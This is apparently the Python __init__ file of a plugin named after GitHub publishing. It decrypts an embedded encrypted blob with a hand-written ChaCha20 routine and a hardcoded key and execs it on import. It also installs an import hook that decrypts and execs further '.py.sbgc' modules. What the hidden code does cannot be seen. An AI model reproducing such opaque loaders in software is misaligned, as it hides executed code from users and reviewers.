
import hashlib as _h
import hmac as _hm
import importlib.abc as _ia
import importlib.util as _iu
import os as _os
import struct as _struct
import sys as _s
import zlib as _z
from pathlib import Path as _P
_MAGIC = b"SBGHPUB2"
_SECRET = _h.sha256(b"SHAOBKJ_GITHUB_PUBLISH_2026_V2").digest()
_PLUGIN_DIR = _P(__file__).resolve().parent
_INIT_PAYLOAD = b'SBGHPUB2\x07\xff\xa2\x93\xb8u\xab"\x8aa\xea\xb1\xee\xfc\x11\x80`\xce\x92\xd9m.\xa7\xdd\xe4\x06\xdb\xb6?6\x10\xad\xddtr8\x04\xf2\x13\xca2\xd0 \xc1\x06VrQ\x02A2\xecU\xfb~\xa5u\xc8|\xc8.\xe3\xc5\x8em*o\x17\xc1\x8f\xcd-\xf1\x03\x81.L\x04\xc0\xaf\x9d\x95\xfe\xb9[3\xfe\x0b\xb87\xea\xe4\xe6\x0bn\x1f\xd7%\xc8\xc7\x18\xd3mo\x18\x1d\x94\x86\xf5u\xe5z\'bD\xa3u\xe3\xe3\xd5_( \x0c\x19\x04\xeb^t;^\xe5\xbaQ\x11.\xd0\x88\xb5\xe2\x87\x01b4Mpq\xad\\[\xd9\x04\xf6\\F\xc4\xe8\x8bUP3aJ\x9e\xd5\x83ryN\x00\x9bT\xa2\xda\xa9>\xa8\xeetj\xe47\r\xc0\xbb\xdd\x8bF\x1cuk\x9b^\x94\x0f"\xf52\xb5M\xc7\xdd\x81\r\xafL\xb2d\x82\xdb\x94\x19yo\xe4m\xe8\x13\xc9v'
def _rotl32(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))
def _quarter_round(state, a, b, c, d):
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 16)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 12)
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 8)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 7)
def _chacha_block(key, nonce, counter):
    state = list(_struct.unpack("<4I", b"expand 32-byte k") + _struct.unpack("<8I", key) + (counter,) + _struct.unpack("<3I", nonce))
    working = state[:]
    for _ in range(10):
        _quarter_round(working, 0, 4, 8, 12); _quarter_round(working, 1, 5, 9, 13); _quarter_round(working, 2, 6, 10, 14); _quarter_round(working, 3, 7, 11, 15)
        _quarter_round(working, 0, 5, 10, 15); _quarter_round(working, 1, 6, 11, 12); _quarter_round(working, 2, 7, 8, 13); _quarter_round(working, 3, 4, 9, 14)
    return _struct.pack("<16I", *[((working[i] + state[i]) & 0xFFFFFFFF) for i in range(16)])
def _crypt(data, nonce):
    out = bytearray(); counter = 1
    for offset in range(0, len(data), 64):
        block = _chacha_block(_SECRET, nonce, counter); counter += 1
        chunk = data[offset:offset + 64]
        out.extend(value ^ block[index] for index, value in enumerate(chunk))
    return bytes(out)
def _decrypt_source(data):
    if not data.startswith(_MAGIC): raise ImportError("Invalid encrypted module.")
    nonce = data[len(_MAGIC):len(_MAGIC) + 12]; tag = data[len(_MAGIC) + 12:len(_MAGIC) + 44]; payload = data[len(_MAGIC) + 44:]
    expected = _hm.new(_SECRET, nonce + payload, _h.sha256).digest()
    if not _hm.compare_digest(tag, expected): raise ImportError("Encrypted module integrity check failed.")
    return _z.decompress(_crypt(payload, nonce)).decode("utf-8-sig").lstrip("\ufeff")
class _Loader(_ia.Loader):
    def __init__(self, fullname, path, is_package=False):
        self.fullname = fullname; self.path = path; self._is_package = is_package
    def create_module(self, spec): return None
    def is_package(self, fullname): return self._is_package
    def exec_module(self, module):
        source = _decrypt_source(self.path.read_bytes())
        module.__file__ = str(self.path); module.__loader__ = self; module.__cached__ = None
        module.__package__ = self.fullname if self._is_package else self.fullname.rpartition(".")[0]
        if self._is_package: module.__path__ = [str(self.path.parent)]
        exec(compile(source, str(self.path), "exec"), module.__dict__)
class _Finder(_ia.MetaPathFinder):
    def find_spec(self, fullname, path=None, target=None):
        prefix = __name__ + "."
        if not fullname.startswith(prefix): return None
        rel_path = fullname[len(prefix):].replace(".", _os.sep); base = _PLUGIN_DIR
        module_file = base / f"{rel_path}.py.sbgc"; package_file = base / rel_path / "__init__.py.sbgc"
        if module_file.is_file(): return _iu.spec_from_loader(fullname, _Loader(fullname, module_file), origin=str(module_file))
        if package_file.is_file():
            loader = _Loader(fullname, package_file, True)
            spec = _iu.spec_from_loader(fullname, loader, origin=str(package_file), is_package=True); spec.submodule_search_locations = [str(package_file.parent)]; return spec
        package_dir = base / rel_path
        if package_dir.is_dir():
            spec = _iu.spec_from_loader(fullname, loader=None, is_package=True); spec.submodule_search_locations = [str(package_dir)]; return spec
        return None
WEB_DIRECTORY = "web"
if not any(isinstance(f, _Finder) for f in _s.meta_path): _s.meta_path.insert(0, _Finder())
exec(compile(_decrypt_source(_INIT_PAYLOAD), str(_PLUGIN_DIR / "__init__.py"), "exec"), globals())
WEB_DIRECTORY = "web"

